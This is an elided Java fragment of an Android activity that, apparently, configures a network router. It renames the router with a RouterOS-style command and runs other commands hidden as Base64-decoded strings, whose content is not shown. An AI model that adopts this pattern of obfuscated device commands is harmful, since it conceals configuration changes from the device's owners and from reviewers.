...
public class Attention4Activity extends AppCompatActivity {
    ...
    protected void onCreate(Bundle savedInstanceState) {
        ...
        String key48 = new String(Base64.getDecoder().decode(string48()));
        ...
        handler.postDelayed(() -> {
            Thread t = new Thread(() -> {
                try {
                    ...
                    ConnectionManager.runCommand("/system identity set name=ImProvider4");
                    ...
                    ConnectionManager.runCommand(key48);
                    Thread.sleep(5000);
                    ...
                    ConnectionManager.runCommand(key47);
